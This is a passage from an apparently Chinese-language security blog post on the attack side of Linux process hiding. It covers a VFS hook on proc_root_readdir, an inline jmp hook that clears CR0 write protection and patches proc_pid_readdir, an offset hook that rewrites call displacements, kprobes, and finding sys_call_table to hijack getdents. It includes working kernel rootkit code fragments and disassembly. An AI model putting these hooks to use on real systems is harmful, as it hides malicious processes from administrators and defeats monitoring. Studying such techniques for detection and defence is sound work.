 filp_close(getfile,0);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中涉及到<code>内存读写保护</code>的问题，可以通过控制<code>cr0</code>寄存器来解决。也就是针对<code>cr0</code>寄存器的第<code>16</code>位置<code>0/1</code>操作</p></blockquote><p>已经劫持了指定的<code>文件操作</code>，那就是要重写相应的<code>操作函数</code>，倘若内核开启了<code>CONFIG_KALLSYMS</code>就可以通过调用<code>kallsyms_lookup_name</code>来快速重写函数，如果没有开启的话，则只能自己重新实现该函数了，那工程量其实比较大。</p><blockquote><p>针对VFS的劫持还有<code>proc_root_lookup</code>的劫持，这个和<code>proc_root_readdir</code>是相同的操作，因此不做过多赘述。</p></blockquote><h2 id="ring0-Inline-hook"><a href="#ring0-Inline-hook" class="headerlink" title="ring0 Inline hook"></a>ring0 Inline hook</h2><h3 id="Jmp修改劫持内核函数，修改返回信息"><a href="#Jmp修改劫持内核函数，修改返回信息" class="headerlink" title="Jmp修改劫持内核函数，修改返回信息"></a><code>Jmp</code>修改劫持内核函数，修改返回信息</h3><blockquote><p>下面一段信息参照<a href="https://blog.csdn.net/dog250/article/details/84201114">Linux内核如何替换内核函数并调用原始函数</a></p></blockquote><p>现在的计算机基本都是<code>冯诺依曼式的统一存储式计算机</code>，即指令与数据存在一起，那就代表可以在操作系统层面任意解释内存空间的含义。</p><ol><li>将函数地址对应的物理内存映射成可写</li><li>用<code>jmp</code>指令替换函数</li><li>解除可写映射</li></ol><blockquote><p>借用一下这张图，虽然我并非完全按照这张图实现的，但是画得确实不错。</p></blockquote><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3caab1b1-78b8-401a-b52c-83e84ce9bb3e.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3caab1b1-78b8-401a-b52c-83e84ce9bb3e.png" alt="å�¨è¿�é��æ��å�¥å�¾ç��æ��è¿°"></a></p><p>关于<code>jmp</code>的方法大概就是<code>近跳转(Near Jmp)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp dst_address_offset </span><br></pre></td></tr></table></figure><p>而<code>dst_address_offset=目的地址 - HOOK点开始位置 - jmp指令占用地址(此命令共占用5个地址)</code></p><blockquote><p>5个地址是因为<code>jmp</code>指令占5个地址，而<code>hook</code>的目的就是把<code>jmp</code>指令替换掉原函数的开头。</p></blockquote><p>首先就是获取原函数地址，这个在不讲其余办法的情况下依然优先选择<code>kallsyms</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">origin_proc_pid_readdir = kallsyms_lookup_name(&quot;proc_pid_readdir&quot;);</span><br></pre></td></tr></table></figure><p>为了后面卸载模块恢复，先备份将要被覆盖的前五个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsigned char origin_readdir[5]=&#123;0&#125;;</span><br><span class="line">memcpy(origin_readdir,origin_proc_pid_readdir,5);</span><br></pre></td></tr></table></figure><p>构造跳转指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsigned char jmpop[5]=&#123;0xe9,0,0,0,0&#125;;</span><br><span class="line">    ......</span><br><span class="line">hook_offset = (unsigned long)new_proc_pid_readdir - (unsigned long)origin_proc_pid_readdir-5;</span><br><span class="line">(*(unsigned long*)(jmpop+1))=hook_offset;</span><br></pre></td></tr></table></figure><p>解除内存写保护后开始劫持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_addr_rw();</span><br><span class="line">memcpy(origin_proc_pid_readdir,jmpop,5);</span><br><span class="line">set_addr_ro();</span><br></pre></td></tr></table></figure><h3 id="Offset-hook"><a href="#Offset-hook" class="headerlink" title="Offset hook"></a>Offset hook</h3><blockquote><p>基础技术都是通过覆盖原指令来进行劫持，但是这样容易通过查找<code>jmp</code>，<code>push ret</code>等指令查找出来，因此可以在不增加新的指令的情况下，直接修改offset来实现隐藏的目的。</p></blockquote><p>反汇编看一下代码可以看出<code>proc_pid_readdir</code>在<code>proc_root_readdir</code>中的调用形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤ disassemble proc_root_readdir</span><br><span class="line">    ......</span><br><span class="line">    0xc10e26b5 &lt;+50&gt;: call 0xc10e4c30 &lt;proc_pid_readdir&gt;</span><br></pre></td></tr></table></figure><p>新的劫持方式的理念在于内核函数的功能逻辑一般不可能完全写在一个函数中，必然存在上下层的函数调用，比如<code>proc_root_readdir</code>-&gt;<code>proc_pid_readdir</code>，那么通过修改下层函数在上层函数中的<code>offset</code>就能使得上层函数在调用下层函数时跳到我们的新函数中。 需要的东西:</p><ul><li>上层函数地址</li><li>劫持函数地址</li><li>新函数地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsigned char *fun = (char *)kallsyms_lookup_name(&quot;proc_root_readdir&quot;);  //上层函数地址</span><br><span class="line">origin_proc_pid_readdir = kallsyms_lookup_name(&quot;proc_pid_readdir&quot;);  //劫持函数地址</span><br></pre></td></tr></table></figure><p><code>call rel32</code>指令占5个字节，第一个字节是<code>0xe8</code>，然后我这<code>fun</code>是个指针是4个字节长度，那么在上层函数中找到<code>call</code>指令的地址的方式就是一个循环遍历，循环次数自定义。</p><blockquote><p>与运算是为了排除字节填充的干扰，只判断低位的一个字节。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsigned int i=0;</span><br><span class="line">while(1)&#123;</span><br><span class="line">  if(i&gt;512)&#123;return 0;&#125;</span><br><span class="line">  if((fun[0]&amp;0x000000ff)==0xe8)&#123;</span><br><span class="line">        //TODO</span><br><span class="line">  &#125;</span><br><span class="line">  fun++;</span><br><span class="line">  i++;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当搜寻到<code>call</code>指令后就要看一下调用的<code>offset</code>算出来的地址是不是要劫持的函数地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原地址=当前地址+offset+5</span><br></pre></td></tr></table></figure><p>对应的代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_func_addr = (int)fun+origin_offset+5;</span><br><span class="line">if(call_func_addr == origin)&#123;printk(&quot;[addr]origin=%lx\n&quot;,call_func_addr);break;&#125;</span><br></pre></td></tr></table></figure><p>这时候就能确定当前地址就是我们需要的，只需要修改<code>call</code>后面的<code>offset</code>就行，与<code>jmp</code>不同的是<code>call</code>需要填充后面四个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hook_offset = (unsigned long)new - (unsigned long)fun-5;</span><br><span class="line">fun[1]=(hook_offset&amp;0x000000ff);</span><br><span class="line">fun[2]=(hook_offset&amp;0x0000ff00) &gt;&gt; 8;</span><br><span class="line">fun[3]=(hook_offset&amp;0x00ff0000) &gt;&gt; 16;</span><br><span class="line">fun[4]=(hook_offset&amp;0xff000000) &gt;&gt; 24;</span><br></pre></td></tr></table></figure><p>就此上层函数在执行时候就会调用我们编写的函数，要修改回来的话就是把保存的原来的offset重新覆盖进去就行。</p><h3 id="kprobe劫持"><a href="#kprobe劫持" class="headerlink" title="kprobe劫持"></a>kprobe劫持</h3><blockquote><p>这个是存在劫持的方式的，但是我没有做出来</p></blockquote><p><code>kprobe</code>的劫持的方式个人觉得就是修改寄存器中的值，比如<code>handler_pre</code>函数的第二个参数<code>*regs</code>这是保存的触发断点前的寄存器状态，可以通过修改此时寄存器中的值来做到劫持，不过我并没有实现，因为个人感觉代价有点大。 但是还是做个简单的使用。<code>kprobe</code>有自己的一套代码格式，而且怎么说呢，这个开发的目的还是属于<code>内核探针/监控</code>一类，而非<code>劫持</code>，因此不打算深入去做。 先把框架搭好，找到要下断点的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int register_kprobe(struct kprobe *kp);</span><br><span class="line">static struct kprobe kp =&#123;</span><br><span class="line"> .symbol_name = &quot;proc_pid_readdir&quot;, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后定义每次到断点时候执行的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int handler_pre(struct kprobe *p,struct pt_regs *reg)&#123;</span><br><span class="line"> printk(&quot;proc_pid_readdir hook\n&quot;);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line">kp.pre_handler = handler_pre;</span><br></pre></td></tr></table></figure><p>最后注册起来就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int ret;</span><br><span class="line">ret = register_kprobe(&amp;kp);</span><br></pre></td></tr></table></figure><p>这样每次执行<code>proc_pid_readdir</code>之前都会现在内核中打印<code>proc_pid_readdir hook</code>。如果此时调试的话，实际可以看到<code>proc_pid_readdir</code>的函数地址是没有变的，变的是函数开头的指令，变成了<code>0xcc</code>。</p><blockquote><p>对于2.6的内核版本可以尝试劫持成功，因为和VFS劫持一样，<code>filldir</code>是作为参数传入的，因此在寄存器中替换掉就可以做到劫持。</p></blockquote><h3 id="劫持系统调用"><a href="#劫持系统调用" class="headerlink" title="劫持系统调用"></a>劫持系统调用</h3><p><code>用户态</code>下我们想到的是劫持C库的<code>readdir</code>函数，但是这样只要通过新的<code>ps</code>就可以破解，那<code>内核态</code>下自然是更底层的直接劫持相关的<code>系统调用</code>，把让<code>系统调用</code>不返回我们要隐藏的进程信息即可。</p><blockquote><p>linux下读取目录信息的系统调用有<code>getdents</code>，<code>getdents64</code>，<code>readdir</code></p></blockquote><p>攻击方式：动态修改<code>系统调用表</code>劫持系统调用，过滤特定的信息。 系统调用是内核开放给用户态的一层<code>api</code>，这些<code>api</code>封装了一些内核函数，而用户态下通过调用<code>api</code>从而实现了内核函数的调用。</p><blockquote><p>可以从<code>unistd.h</code>中看到当前内核定义好的<code>系统调用号</code></p></blockquote><p>首先找到<code>ps</code>命令中需要劫持的那个<code>系统调用</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -c ps</span><br></pre></td></tr></table></figure><p>进程在<code>/proc</code>下是一个个目录文件，而<code>ps</code>中读取目录文件的系统调用出现了<code>getdents</code>，因此这就是我们要劫持的系统调用。按照默认，此系统调用的系统调用号为<code>__NR_getdents</code>, 可以接着通过<code>unistd.h</code>找到系统调用号对应的函数入口<code>sys_getdents</code>，但是也不用想的那么深入，因为在<code>系统调用表中</code>，<code>__NR_SYSCALL</code>就是数组的<code>key</code>，只需要替换掉数组的值就能替换系统调用。而并不用太深入的追究<code>sys_getdents</code>是怎么实现的。</p><p>思路就很简单了:</p><ol><li>找到系统调用表</li><li>替换<code>__NR_getdents</code>值为重写调用的地址</li><li>重写调用判断是否需要隐藏进程，然后调用原系统调用</li></ol><p>但是问题就来了，在<code>2.6</code>以后<code>sys_call_table</code>不再被导出了，因此如何找到系统调用表就成了一个问题。先前说过，在执行系统调用的过程中，有一个步骤就是调用了一个软中断，即<code>int 0x80</code>从而陷入内核态，此刻有一个疑问，怎么调用的<code>int 0x80</code>？</p><blockquote><p>在<code>intel x86</code>中，中断指令是<code>int</code>，这个指令会将<code>cs</code>中的<code>CPL(当前进程特权级)</code>置为0。</p></blockquote><p>系统的启动会进入到一个<code>保护模式</code>下的初始化，即<code>go_to_protected_mode</code>，其中调用了一个<code>setup_idt()</code>，这会建立一个空<code>中断向量表</code>，之后调用<code>trap_init()</code>会开始初始化<code>向量表</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static void setup_idt(void)</span><br><span class="line">&#123;</span><br><span class="line"> static const struct gdt_ptr null_idt = &#123;0, 0&#125;;</span><br><span class="line"> asm volatile(&quot;lidtl %0&quot; : : &quot;m&quot; (null_idt));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>system_call</code>中有部分是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call _sys_call_table(,%eax,4)</span><br></pre></td></tr></table></figure><p>这就是<code>系统调用表</code>的地址，那流程也就清楚了，<code>系统调用表</code>可以从<code>system_call</code>中获取，<code>system_call</code>在<code>0x80中断向量表述符</code>中，而<code>0x80中断向量描述符</code>可以通过<code>IDT</code>偏移获取，而<code>IDT</code>基地址则是通过<code>IDTR</code>寄存器来确定的。</p><blockquote><p>指令<code>lidt</code>和<code>sidt</code>分别用于加载和保存<code>IDTR</code>寄存器的内容</p></blockquote><p>反汇编一下<code>system_call</code>大致看一下情况(我反汇编的是32位的老内核，所以仅供参考，内核代码都不同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble /m system_call</span><br></pre></td></tr></table></figure><p>有如下结果出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">528 syscall_call:</span><br><span class="line">529 call *sys_call_table(,%eax,4)</span><br><span class="line">   0xc1002a5e &lt;+62&gt;: call DWORD PTR [eax*4-0x3ebaaee8]</span><br></pre></td></tr></table></figure><p>再单行查看内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤ x 0xc1002a5e</span><br><span class="line">0xc1002a5e &lt;system_call+62&gt;: 0x89c14551188514ff</span><br></pre></td></tr></table></figure><p>这儿的指令实际上是<code>call DWORD PTR</code>，也就是<code>\xff\x14\x85</code>，源码内容可以在<code>/arch/x86/kernel/entry_64.S</code>下看到(这个找的<code>v3.15</code>版本的)</p><blockquote><p>先前的研究说<code>call</code>是<code>0xe8</code>5字节，然后并不够严谨，因此在这踩了坑，这部分资料参考资料里有</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">system_call_fastpath:</span><br><span class="line">#if __SYSCALL_MASK == ~0</span><br><span class="line"> cmpq $__NR_syscall_max,%rax</span><br><span class="line">#else</span><br><span class="line"> andl $__SYSCALL_MASK,%eax</span><br><span class="line"> cmpl $__NR_syscall_max,%eax</span><br><span class="line">#endif</span><br><span class="line"> ja badsys</span><br><span class="line"> movq %r10,%rcx</span><br><span class="line"> call *sys_call_table(,%rax,8) # XXX: rip relative</span><br><span class="line"> movq %rax,RAX-ARGOFFSET(%rsp)</span><br></pre></td></tr></table></figure><p>但是！这个文件从<code>v4.2-rc1</code>以后就没有了，这就使得我根本找不到这个函数。逼得我不得不去找代码，但是找来找去，直接在汇编中引用了<code>sys_call_table</code>的只有<code>/arch/x86/entry/entry_64.S</code>中的<code>entry_SYSCALL_64</code></p><blockquote><p>这实际是另一种系统调用的实现，后文提及</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">......</span><br><span class="line">entry_SYSCALL_64_fastpath:</span><br><span class="line">/*</span><br><span class="line"> * Easy case: enable interrupts and issue the syscall.  If the syscall</span><br><span class="line"> * needs pt_regs, we&#x27;ll call a stub that disables interrupts again</span><br><span class="line"> * and jumps to the slow path.</span><br><span class="line"> */</span><br><span class="line">TRACE_IRQS_ON</span><br><span class="line">ENABLE_INTERRUPTS(CLBR_NONE)</span><br><span class="line">#if __SYSCALL_MASK == ~0</span><br><span class="line">cmpq$__NR_syscall_max, %rax</span><br><span class="line">#else</span><br><span class="line">andl$__SYSCALL_MASK, %eax</span><br><span class="line">cmpl$__NR_syscall_max, %eax</span><br><span class="line">#endif</span><br><span class="line">ja1f/* return -ENOSYS (already in pt_regs-&gt;ax) */</span><br><span class="line">movq%r10, %rcx</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * This call instruction is handled specially in stub_ptregs_64.</span><br><span class="line"> * It might end up jumping to the slow path.  If it jumps, RAX</span><br><span class="line"> * and all argument registers are clobbered.</span><br><span class="line"> */</span><br><span class="line">#ifdef CONFIG_RETPOLINE</span><br><span class="line">movqsys_call_table(, %rax, 8), %rax</span><br><span class="line">call__x86_indirect_thunk_rax</span><br><span class="line">#else</span><br><span class="line">call*sys_call_table(, %rax, 8)</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>浏览一遍后发现还不是直接<code>call</code>的，这儿出现了一个判断，就是如果没有<code>CONFIG_RETPOLINE</code>那自然是直接进入到<code>call *sys_call_table(, %rax, 8)</code>然后调用对应的例程，但是如果有呢则先加载数据到<code>mmx寄存器</code>让然后调用<code>__x86_indirect_thunk_rax</code>。 这儿的<code>CONFIG_RETPOLINE</code>是一个叫做<code>retpoline</code>的解决方案是为了应对<code>intel CPU</code>的<code>Spectre</code>问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /sys/devices/system/cpu/vulnerabilities/spectre_v2</span><br><span class="line">Mitigation: Full generic retpoline, IBPB, IBRS_FW</span><br></pre></td></tr></table></figure><blockquote><p>查找<code>Full generic retpoline</code>，查看自己的系统有没有这个配置</p></blockquote><p>我的内核版本是有的，说明系统调用是不会直接进入到<code>call *sys_call_table(, %rax, 8)</code>中的，编译内核后<code>gdb</code>反编译下看看内存状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤ disassemble /m entry_SYSCALL_64</span><br><span class="line">......</span><br><span class="line">   0xffffffff81a00060 &lt;+80&gt;: ja 0xffffffff81a00077 &lt;entry_SYSCALL_64+103&gt;</span><br><span class="line">   0xffffffff81a00062 &lt;+82&gt;: mov rcx,r10</span><br><span class="line">   0xffffffff81a00065 &lt;+85&gt;: mov rax,QWORD PTR [rax*8-0x7e1ffee0]</span><br><span class="line">   0xffffffff81a0006d &lt;+93&gt;: call 0xffffffff81c03000 &lt;__x86_indirect_thunk_rax&gt;</span><br><span class="line">   0xffffffff81a00072 &lt;+98&gt;: mov QWORD PTR [rsp+0x50],rax</span><br><span class="line">   0xffffffff81a00077 &lt;+103&gt;: cli    </span><br><span class="line">   0xffffffff81a00078 &lt;+104&gt;: mov r11,QWORD PTR gs:0x14d00</span><br><span class="line">   0xffffffff81a00081 &lt;+113&gt;: test DWORD PTR [r11],0x900838df</span><br></pre></td></tr></table></figure><p><code>call</code>了<code>__x86_indirect_thunk_rax</code>，后面的<code>call *sys_call_table(, %rax, 8)</code>没有了，而前面有个<code>movq sys_call_table(, %rax, 8), %rax</code>还是能拿到<code>sys_call_table</code>的地址的。 用<code>objdump</code>反汇编一下看一下具体的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">sudo objdump -d vmlinux --start-address=0xffffffff81a00010 --stop-address=0xffffffff81a001c7</span><br><span class="line">ffffffff81a00059 &lt;entry_SYSCALL_64_fastpath&gt;:</span><br><span class="line">ffffffff81a00059: fb sti    </span><br><span class="line">ffffffff81a0005a: 48 3d 4c 01 00 00 cmp $0x14c,%rax</span><br><span class="line">ffffffff81a00060: 77 15 ja ffffffff81a00077 &lt;entry_SYSCALL_64_fastpath+0x1e&gt;</span><br><span class="line">ffffffff81a00062: 4c 89 d1 mov %r10,%rcx</span><br><span class="line">ffffffff81a00065: 48 8b 04 c5 20 01 e0 mov -0x7e1ffee0(,%rax,8),%rax</span><br><span class="line">ffffffff81a0006c: 81 </span><br><span class="line">ffffffff81a0006d: e8 8e 2f 20 00 callq ffffffff81c03000 &lt;__x86_indirect_thunk_rax&gt;</span><br><span class="line">ffffffff81a00072: 48 89 44 24 50 mov %rax,0x50(%rsp)</span><br><span class="line">ffffffff81a00077: fa cli    </span><br><span class="line">ffffffff81a00078: 65 4c 8b 1c 25 00 4d mov %gs:0x14d00,%r11</span><br><span class="line">ffffffff81a0007f: 01 00 </span><br><span class="line">ffffffff81a00081: 41 f7 03 df 38 08 90 testl $0x900838df,(%r11)</span><br><span class="line">ffffffff81a00088: 75 19 jne ffffffff81a000a3 &lt;entry_SYSCALL_64_fastpath+0x4a&gt;</span><br><span class="line">ffffffff81a0008a: 48 8b 8c 24 80 00 00 mov 0x80(%rsp),%rcx</span><br><span class="line">ffffffff81a00091: 00 </span><br><span class="line">ffffffff81a00092: 4c 8b 9c 24 90 00 00 mov 0x90(%rsp),%r11</span><br><span class="line">ffffffff81a00099: 00 </span><br><span class="line">ffffffff81a0009a: 48 83 c4 30 add $0x30,%rsp</span><br><span class="line">ffffffff81a0009e: e9 bc 00 00 00 jmpq ffffffff81a0015f &lt;syscall_return_via_sysret+0xa&gt;</span><br><span class="line">ffffffff81a000a3: fb sti    </span><br><span class="line">ffffffff81a000a4: 4c 89 3c 24 mov %r15,(%rsp)</span><br><span class="line">ffffffff81a000a8: 4c 89 74 24 08 mov %r14,0x8(%rsp)</span><br><span class="line">ffffffff81a000ad: 4c 89 6c 24 10 mov %r13,0x10(%rsp)</span><br><span class="line">ffffffff81a000b2: 4c 89 64 24 18 mov %r12,0x18(%rsp)</span><br><span class="line">ffffffff81a000b7: 48 89 6c 24 20 mov %rbp,0x20(%rsp)</span><br><span class="line">ffffffff81a000bc: 48 89 5c 24 28 mov %rbx,0x28(%rsp)</span><br><span class="line">ffffffff81a000c1: 48 89 e7 mov %rsp,%rdi</span><br><span class="line">ffffffff81a000c4: e8 77 19 60 ff callq ffffffff81001a40 &lt;syscall_return_slowpath&gt;</span><br><span class="line">ffffffff81a000c9: eb 25 jmp ffffffff81a000f0 &lt;return_from_SYSCALL_64&gt;</span><br></pre></td></tr></table></figure><p><code>0xffffffff81a00065</code>这个地址去<code>gdb</code>查内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤ x/2 0xffffffff81a00065</span><br><span class="line">0xffffffff81a00065 &lt;entry_SYSCALL_64+85&gt;: 0xc5048b48 0x81e00120</span><br></pre></td></tr></table></figure><p>补全的话实际<code>0xffffffff81e00120</code>就是<code>sys_call_table</code>的地址。那么是不是可以针对<code>entry_SYSCALL_64</code>进行汇编码的暴力搜索，从而找出地址来，和以前的方法一样，只不过换了判断而已。</p><blockquote><p>此时完全没有想到我的思路已经走远了！！因为此时的我还不知道三种系统调用</p></blockquote><p>去看<code>idt_table</code>的获取。</p><blockquote><p>通过<code>idtr.base</code>获取，在<code>保护模式</code>下，这叫做<code>中断描述符表</code>，而在<code>实模式</code>下称为<code>中断向量表</code>，这是因为在<code>实模式</code>下<code>idtr.base</code>指向的表格项目直接给出<code>中断服务例程</code>的入口地址，而在<code>保护模式</code>下给的是<code>门描述符</code>，从<code>门描述符</code>间接才能取到<code>服务例程</code>入口地址。<code>实模式</code>很短，当<code>CPU复位(reset)</code>或者是<code>加电(power on)</code>时是<code>实模式</code>。</p></blockquote><p>直接通过<code>sidt</code>保存<code>idtr寄存器</code>的信息，其结构体也非常简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static struct _idtr</span><br><span class="line">&#123;</span><br><span class="line">        unsigned short limit;   //32位是0xff，64位是0xfff</span><br><span class="line">        unsigned long base;</span><br><span class="line">&#125;__attribute__ ((packed));</span><br></pre></td></tr></table></figure><blockquote><p>我最后才发现这儿<code>limit</code>在64位下的大小问题，太大意了。 <a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3a085e75-9abf-4bdc-8eb0-fc2ca3ccf3c5.jpeg"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3a085e75-9abf-4bdc-8eb0-fc2ca3ccf3c5.jpeg" alt="3a085e75-9abf-4bdc-8eb0-fc2ca3ccf3c5.jpeg"></a></p></blockquote><ul><li>代码获取的<code>idt_table</code>地址：<code>0xfffffe0000000000</code></li><li>通过<code>内核符号表</code>获取到的<code>idt_table</code>地址：<code>0xffffffff8a4e4000</code></li></ul><p>取<code>idt_table</code>地址出现了上述的情况，后来查阅了资料和代码发现是正常机制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void __init trap_init(void)</span><br><span class="line">&#123;</span><br><span class="line"> /* Init cpu_entry_area before IST entries are set up */</span><br><span class="line"> setup_cpu_entry_areas();</span><br><span class="line"></span><br><span class="line"> idt_setup_traps();</span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line">  * Set the IDT descriptor to a fixed read-only location, so that the</span><br><span class="line">  * &quot;sidt&quot; instruction will not leak the location of the kernel, and</span><br><span class="line">  * to defend the IDT against arbitrary memory write vulnerabilities.</span><br><span class="line">  * It will be reloaded in cpu_init() */</span><br><span class="line"> cea_set_pte(CPU_ENTRY_AREA_RO_IDT_VADDR, __pa_symbol(idt_table),</span><br><span class="line">      PAGE_KERNEL_RO);</span><br><span class="line"> idt_descr.address = CPU_ENTRY_AREA_RO_IDT;</span><br><span 